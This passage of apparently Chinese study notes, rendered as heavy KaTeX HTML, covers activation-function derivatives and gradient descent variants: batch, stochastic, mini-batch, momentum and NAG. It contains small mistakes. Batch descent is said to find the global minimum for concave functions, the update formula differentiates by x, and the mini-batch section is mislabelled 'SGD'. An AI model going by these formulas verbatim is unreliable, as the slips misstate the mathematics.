size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>r</mi><mi>e</mi><mi>l</mi><mi>u</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x)=relu(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">u</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>f</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn><mi>i</mi><mi>f</mi><mi>x</mi><mo>&lt;</mo><mn>0</mn><mi>e</mi><mi>l</mi><mi>s</mi><mi>e</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">f&#x27;(x)=0 if x&lt;0 else 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord">1</span></span></span></span></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>s</mi><mi>o</mi><mi>f</mi><mi>t</mi><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mi>exp</mi><mo>⁡</mo><msub><mi>x</mi><mi>i</mi></msub></mrow><mrow><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>J</mi></msubsup><mrow><mi>exp</mi><mo>⁡</mo><msub><mi>x</mi><mi>j</mi></msub></mrow></mrow></mfrac></mrow><annotation encoding="application/x-tex">f(x)=softmax(x)=\frac{\exp{x_i}}{\sum_{j=1}^{J}{\exp{x_j}}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">t</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.499392em;vertical-align:-0.751892em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7475em;"><span style="top:-2.570335em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight"><span class="mop op-symbol small-op mtight" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8852357142857143em;"><span style="top:-2.1785614285714283em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-2.8971428571428572em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.09618em;">J</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.46032428571428574em;"><span></span></span></span></span></span></span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mtight"><span class="mop mtight">exp</span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.446108em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight">exp</span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><msub><mi>f</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi>x</mi><mi>j</mi></msub></mrow></mfrac><mo>=</mo><msub><mi>f</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mi>δ</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo>−</mo><msub><mi>f</mi><mi>j</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo separator="true">,</mo><msub><mi>δ</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo>=</mo><mn>0</mn><mi>i</mi><mi>f</mi><mi>i</mi><mo stretchy="false">!</mo><mo>=</mo><mi>j</mi><mi>e</mi><mi>l</mi><mi>s</mi><mi>e</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">\frac{\partial f_i(x)}{\partial x_j}=f_i(x)(\delta_{ij}-f_j(x)),\delta_{ij}=0 if i!=j else 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.55232em;vertical-align:-0.5423199999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.10764em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathdefault mtight">x</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5423199999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord">1</span></span></span></span></td></tr></tbody></table><h2 id="梯度下降法"><a class="markdownIt-Anchor" href="#梯度下降法"></a> 梯度下降法</h2><ul><li>求解非线性无约束优化问题的基本方法</li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>w</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>=</mo><msub><mi>w</mi><mi>i</mi></msub><mo>−</mo><mi>a</mi><mfrac><mrow><mi mathvariant="normal">∂</mi><mi>J</mi></mrow><mrow><mi mathvariant="normal">∂</mi><mi>x</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">w_{i+1}=w_i-a\frac{\partial{J}}{\partial{x}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.638891em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord mathdefault">a</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.09618em;">J</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></li><li>J是损失函数，沿负梯度方向迭代求解最优参数，a是学习率</li></ul><h3 id="批量梯度下降"><a class="markdownIt-Anchor" href="#批量梯度下降"></a> 批量梯度下降</h3><ul><li><p>(Batch Gradient Descent )利用全部训练数据集计算损失函数的梯度来执行一次参数更新</p></li><li><p>\theta<=\theta-\eta\cdat\triangledown{J(\theta)}</p></li><li><p>缺点：更新较慢、不能在线更新模型</p></li><li><p>优点：对凹函数可得到全局最小，非凸函数可收敛到局部极小</p></li></ul><h3 id="随机梯度下降"><a class="markdownIt-Anchor" href="#随机梯度下降"></a> 随机梯度下降</h3><ul><li>SGD (Stochastic Gradient Descent)对每一个训练样本点和标签执行参数更新</li><li>\theta<=\theta-\eta\cdat\triangledown{J(\theta;x^{(i)};y^{(i)})}</li><li>缺点：梯度精度差、目标函数下降过程出现较大波动、难以跳出局部极小值点和鞍点</li><li>优点：速度快，可在线学习</li></ul><h3 id="小批量梯度下降"><a class="markdownIt-Anchor" href="#小批量梯度下降"></a> 小批量梯度下降</h3><ul><li>SGD (Stochastic Gradient Descent)每𝑚个训练样本点，进行一次参数更新</li><li>\theta<=\theta-\eta\cdat\triangledown{J(\theta;x^{(i:i+m)};y^{(i:i+m)})}</li><li>Batch-GD和单样本SGD方法的折衷</li><li>优点：减小了参数更新的方差，可平稳收敛；速度快，可利用优化的矩阵运算库来高效的计算梯度</li><li>Batch大小根据问题来定。一般而言设为32、 64、 128或256即可。</li></ul><h3 id="梯度下降改进算法"><a class="markdownIt-Anchor" href="#梯度下降改进算法"></a> 梯度下降改进算法</h3><h4 id="动量法momentum"><a class="markdownIt-Anchor" href="#动量法momentum"></a> 动量法Momentum</h4><ul><li><p>动量法，把过去时间步骤更新矢量的一部分（𝛾）加到当前更新矢量</p></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>v</mi><mn>1</mn><mo>=</mo><mi>η</mi><mi mathvariant="normal">▽</mi><mrow><mi>J</mi><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo></mrow></mrow><annotation encoding="application/x-tex">v1=\eta\triangledown{J(\theta)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="mord amsrm">▽</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.09618em;">J</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span></span></span></span></span> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>v</mi><mi>k</mi></msub><mo>=</mo><mi>γ</mi><msub><mi>v</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>+</mo><mi>η</mi><mi mathvariant="normal">▽</mi><mi>J</mi><mo stretchy="false">(</mo><mi>θ</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>γ</mi><mo>∈</mo><mo stretchy="false">(</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">v_k=\gamma v_{k-1}+\eta\triangledown J(\theta{k-1}), \gamma\in(0,1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.791661em;vertical-align:-0.208331em;"></span><span class="mord mathdefault" style="margin-right:0.05556em;">γ</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="mord amsrm">▽</span><span class="mord mathdefault" style="margin-right:0.09618em;">J</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05556em;">γ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>θ</mi><mi>k</mi></msub><mo>=</mo><msub><mi>θ</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>−</mo><msub><mi>v</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">\theta_k=\theta_{k-1}-v_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.902771em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p></li><li><p>动量项𝛾 一般设为0.9。可理解为“摩擦”效果，速度的逐渐增加是作为梯度的移动平均</p></li></ul><h4 id="nag"><a class="markdownIt-Anchor" href="#nag"></a> NAG</h4><ul><li>NAG是为动量项提供预知能力的一种方法。</li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>v</mi><mi>k</mi></msub><mo>=</mo><mi>γ</mi><msub><mi>v</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>+</mo><mi>η</mi><mi mathvariant="normal">▽</mi><mi>J</mi><mo stretchy="false">(</mo><mi>θ</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow><mo>−</mo><mi>γ</mi><msub><mi>v</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>γ</mi><mo>∈</mo><mo stretchy="false">(</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">v_k=\gamma v_{k-1}+\eta\triangledown J(\theta{k-1}-\gamma v_{k-1}), \gamma\in(0,1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 